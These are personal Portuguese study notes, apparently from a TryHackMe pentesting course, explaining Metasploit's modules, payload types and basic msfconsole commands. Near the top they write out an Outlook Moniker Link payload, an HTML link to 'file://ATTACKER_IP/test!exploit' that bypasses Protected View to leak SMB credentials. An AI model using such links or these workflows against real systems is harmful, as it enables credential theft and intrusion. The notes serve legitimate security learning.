# METASPLOIT - Básico

> Aqui vou compartilhar minhas notas pessoais sobre cada um dos temas aprendidos no camihno Pentester do TryHackMe

A vulnerabilidade analisada visa o seguinte:

O outlook rendeniza e-mails como HTML, também pode analisar hiperlinks como HTTP e HTTPS, mas também pode abrir urls especificando apps conhecidos como Moniker Links, normalmente o Outlook enviaria um aviso de segurança quando esses apps externos são acionados.

Ao utilizar `file://` Moniker LInk em nosso hyperlink, nós podemos intstruir o outlook a tentar acessar um arquivo, como um arquivo em uma rede.

`<a href="file://ATTACKER_IP/test">Click me</a>`

O protocolo SMB é usado, o que envolve o uso de credenciais locais para auteiticação, no entanto aparece um pop up bloqueando tal inteção.

A vulnerabilidade aqui existe modificando nosso hiperlink para incluir o ! caractere especial e algum texto em nosso Link de apelido que resulta em Ignorar Vista protegida do Outlook. Por exemplo: `<a href="file://ATTACKER_IP/test!exploit">Click me</a>`. 

# Introdução ao Metasploit

Ferramenta que pode suportar todas as fases de um engajamento de teste de penetração, desde a coleta de informações até a pós-exploração.

O Metasploit Framework é um conjunto de ferramentas que permitem a coleta de informações, varredura, exploração, desenvolvimento de exploits, pós-exploração e muito mais. Enquanto o uso primário do Metasploit Framework foca no domínio de testes de penetração, também é útil para pesquisa de vulnerabilidades e desenvolvimento de exploits. 

---

- msfconsole : A principal interface de linha de comando.
- Módulos : suportando módulos como exploits, scanners, payloads, etc.
- Ferramentas : Ferramentas autônomas que ajudarão na pesquisa de vulnerabilidades, avaliação de vulnerabilidade , ou teste de penetração. Algumas dessas ferramentas são msfvenom, pattern_create e pattern_offset. Abordaremos o msfvenom dentro deste módulo, mas pattern_create e pattern_offset são ferramentas úteis no desenvolvimento de exploits que estão além do escopo deste módulo. 

---

Quando usamos o Metasploit, vamos interagir principalmente com o metasploit console. Ele é iniciado no terminal com o comando `msfconsole`.

Com isso, poderemos interagir com os diferentes módulos do metasploit framework -> módulos são pequenos componentes dentro dele, criada para executar uma tarefa específica, como explorar uma vulnerabilidade, verificar um alvo ou executar um ataque de Força bruta. 

---

- Exploit: Um pedaço de código que usa uma vulnerabilidade presente no sistema de destino.
- Vulnerabilidade: Uma falha de projeto, codificação ou lógica que afeta o sistema de destino. A exploração de uma vulnerabilidade pode resultar na divulgação de informações confidenciais ou permitir que o invasor execute código no sistema de destino.
- payload: Um exploit se aproveitará de uma vulnerabilidade. No entanto, se quisermos que o exploit tenha o resultado que queremos (obter acesso ao sistema de destino, ler informações confidenciais, etc.), precisamos usar uma payload. Payloads são o código que será executado no sistema de destino. 

--- 

Recursos do metasploit:

## AUxiliary

qualquer módulo de suporte, como scanners, crawlers e fuzzers pode ser encontrado aqui

/usr/share/metasploit-framework/modules/auxiliary

---

## Encoders

Os codificadores permitirão que você codifique o exploit e a carga útil na esperança de que uma solução antivírus baseada em assinatura possa perdê-los. 

/usr/share/metasploit-framework/modules/encoders

---

## Evasão

Embora os codificadores codifiquem a carga útil, eles não devem ser considerados uma tentativa direta de evitar o software antivírus. Por outro lado, os módulos de "evasão" tentarão isso, com mais ou menos sucesso. 

/usr/share/metasploit-framework/modules/evasion

---

## Exploits

Exploits, ordenadamente organizados pelo sistema de destino. 

/usr/share/metasploit-framework/modules/exploits

---

## NOPs

NOPs (sem operação) não fazem nada, literalmente. Eles estão representados no Intel x86 CPU família com 0x90, seguindo o qual o CPU não fará nada por um ciclo. São usados frequentemente como um amortecedor conseguir tamanhos consistentes do payload. 

---


## Payloads

Códigos que serão executados no sistema de destino.

As explorações aproveitarão uma vulnerabilidade no sistema de destino, mas para alcançar o resultado desejado, precisaremos de uma carga útil. Exemplos podem ser; obter um shell, carregar um malware ou backdoor no sistema de destino, executar um comando ou iniciar o calc.exe como uma prova de conceito para adicionar ao relatório de teste de penetração. Iniciando a calculadora no sistema de destino remotamente, iniciando o calc.o aplicativo exe é uma maneira benigna de mostrar que podemos executar comandos no sistema de destino.

Executar o comando no sistema de destino já é um passo importante, mas ter uma conexão interativa que permita digitar comandos que serão executados no sistema de destino é melhor. Essa linha de comando interativa é chamada de "shell". Metasploit oferece a capacidade de enviar diferentes cargas úteis que podem abrir projéteis no sistema de destino. 

/usr/share/metasploit-framework/modules/payloads

---

Adaptadores (wrappers) — Camadas que transformam uma payload num formato de entrega diferente (ex.: um one-liner PowerShell). Úteis para facilitar execução, mas costumam deixar traços óbvios.

Singles (standalone) — Payloads autossuficientes que executam toda a ação sem baixar nada. Robustos em redes restritas, porém geralmente maiores e mais detectáveis.

Stagers — Pequenos payloads de bootstrap que estabelecem um canal (conexão) entre atacante e alvo para depois puxar o restante. Vantagem: tamanho inicial reduzido; desvantagem: dependem da rede.

Stages (etapas) — Componentes maiores baixados pelo stager que contêm a lógica completa (ex.: meterpreter). Permitem funcionalidades avançadas, mas o download é um ponto de detecção.

---

## Post - é para a pós-exploração

/usr/share/metasploit-framework/modules/post


---

# Rodando o metasploit

`msfconsole` abre a ferramenta.

Ele pode ser usando como CLI normalmente.

Ele suporta tabulações, então se eu começar a digitar algo e apertar tab, ele vai auto completando.

o módulo a ser utilizado, é selecionado com o `use (cmainho do modulo)`

`show options` ,pstra as opções que precisamos preencher

`back` volta ao diretório principal do metasploit

`info` dentro de um modulo mostra a visão geral sobre ele - também da pra fazer `info + caminhodomodulo`

da pra usar `search + palavra-chave` para buscar algo nos módulos.

Da pra pesquisar usando tipo também, com por ex: `search type:payload php` mostra todos os payloads para php.

---

Após escolher o módulo preferido, precisamos configurar seus parametros para rodar o ataque.

Fazemos isso com:

`set PARAMETER_NAME VALUE`

Sempre segue nessa linha - e vemos suas opções com o anteriormente falado `show options`

---

RHOSTS -> Endereço de destino / público ou privado.

RPORT -> a porta a qual queremos atacar.

Payload -> O payload que você usará com o exploit.

LHOST -> o endereço da minha máquina

LPORT -> a porta de acesso na minha máquina.

session -> pra pós-exploração.

---

`unset all` limpa todos os campos

`setg` diferente do `set`, deixa salvo globalmente para todos os módulos, então se eu trocar de um exploit para outro, o host configurado com `setg` continuará o mesmo.

---

Depois que estiver tudo configurado, podemos passar um `exploit` ou `exploit -z` para iniciar, o parametro `-z` abre uma sessão em segundo plano após o ataque.